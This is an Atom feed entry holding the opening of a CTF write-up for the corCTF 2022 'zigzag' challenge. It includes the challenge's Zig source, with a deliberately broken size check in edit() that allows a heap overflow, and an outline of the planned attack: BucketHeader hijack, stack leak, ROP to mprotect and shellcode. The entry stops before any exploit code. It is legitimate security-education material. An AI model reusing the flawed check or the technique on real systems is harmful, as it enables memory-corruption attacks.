<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[2022 on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/2022/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/2022/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2022-11-19T02:39:54+01:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/2022/</id>
        
        <entry>
            <title type="html"><![CDATA[[corCTF 2022 - pwn] zigzag]]></title>
            <link href="https://nasm.re/posts/zigzag/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/zigzag/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-08-08T00:00:00+00:00</published>
            <updated>2022-08-08T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p><code>zigzag</code> is a zig heap challenge I did during the <a
  class="gblog-markdown__link"
  href="https://ctftime.org/event/1656"
  
  >corCTF 2022</a
> event. It was pretty exotic given we have to pwn a heap like challenge written in <a
  class="gblog-markdown__link"
  href="https://ziglang.org/"
  
  >zig</a
>. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2022/corCTF/pwn/zieg"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tl-dr">
        TL; DR
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>Understanding zig <code>GeneralPurposeAllocator</code> internals</li>
<li>Hiijack the <code>BucketHeader</code> of a given bucket to get a write what were / read what where primitive.</li>
<li>Leak stack + ROP on the fileRead function (mprotect + shellcode)</li>
<li>PROFIT</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="source-code-analysis">
        Source code analysis
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#source-code-analysis" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Source code analysis" href="#source-code-analysis">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The source code is procided:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="c1">// zig build-exe main.zig -O ReleaseSmall
</span><span class="c1">// built with zig version: 0.10.0-dev.2959+6f55b294f
</span><span class="c1"></span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">std</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">import</span><span class="p">(</span><span class="s">&#34;std&#34;</span><span class="p">);</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">fmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">fmt</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">stdout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">getStdOut</span><span class="p">().</span><span class="n">writer</span><span class="p">();</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">stdin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">getStdIn</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">MAX_SIZE</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mh">0x500</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">ERR</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mh">0xbaad0000</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">NULL</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mh">0xdead0000</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">chunklist</span>: <span class="p">[</span><span class="mi">20</span><span class="p">][]</span><span class="kt">u8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">gpa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">heap</span><span class="p">.</span><span class="n">GeneralPurposeAllocator</span><span class="p">(.{}){};</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">allocator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gpa</span><span class="p">.</span><span class="n">allocator</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">menu</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[1] Add\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[2] Delete\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[3] Show\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[4] Edit\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[5] Exit\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">readNum</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="kt">usize</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">buf</span>: <span class="p">[</span><span class="mi">64</span><span class="p">]</span><span class="kt">u8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">stripped</span>: <span class="p">[]</span><span class="k">const</span><span class="w"> </span><span class="kt">u8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">amnt</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">num</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">amnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">stripped</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">mem</span><span class="p">.</span><span class="n">trimRight</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="n">amnt</span><span class="p">],</span><span class="w"> </span><span class="s">&#34;\n&#34;</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fmt</span><span class="p">.</span><span class="n">parseUnsigned</span><span class="p">(</span><span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">stripped</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ERR</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">};</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">num</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">add</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">size</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">MAX_SIZE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid size!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">allocator</span><span class="p">.</span><span class="n">alloc</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">delete</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">allocator</span><span class="p">.</span><span class="n">free</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">intToPtr</span><span class="p">([</span><span class="o">*</span><span class="p">]</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">show</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;{s}\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]});</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">edit</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">size</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid size!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">size</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">choice</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">chunklist</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="n">_</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="n">chunklist</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">intToPtr</span><span class="p">([</span><span class="o">*</span><span class="p">]</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="n">chunklist</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">menu</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="n">choice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="p">)</span><span class="w"> </span><span class="k">continue</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">add</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">delete</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">show</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">edit</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p>The source code is quite readable, the vulnerability is the overflow within the <code>edit</code> function. The check onto the provided size isn&rsquo;t efficient, <code>size &gt; chunklist[idx].len and size == ERR</code>, if <code>size &gt; chunklist[idx].len</code> and if <code>size != ERR</code> the condition is false. Which means we can edit the chunk by writing an arbitrary amount of data in it.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="generalpurposeallocator-abstract">
        GeneralPurposeAllocator abstract
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#generalpurposeallocator-abstract" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor GeneralPurposeAllocator abstract" href="#generalpurposeallocator-abstract">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The <a
  class="gblog-markdown__link"
  href="https://github.com/ziglang/zig/"
  
  >zig</a
> source is quite readable so let&rsquo;s take a look at the internals of the GeneralPurposeAllocator allocator.
The GeneralPurposeAllocator is implemented <a
  class="gblog-markdown__link"
  href="https://github.com/ziglang/zig/blob/master/lib/std/heap/general_purpose_allocator.zig"
  
  >here</a
>.
The header of the source code file gives the basic design of the allocator:</p>
<pre tabindex="0"><code>//! ## Basic Design:
//!
//! Small allocations are divided into buckets:
//!
//! ```
//! index obj_size
//! 0     1
//! 1     2
//! 2     4
//! 3     8
//! 4     16
//! 5     32
//! 6     64
//! 7     128
//! 8     256
//! 9     512
//! 10    1024
//! 11    2048
//! ```
//!
//! The main allocator state has an array of all the &quot;current&quot; buckets for each
//! size class. Each slot in the array can be null, meaning the bucket for that
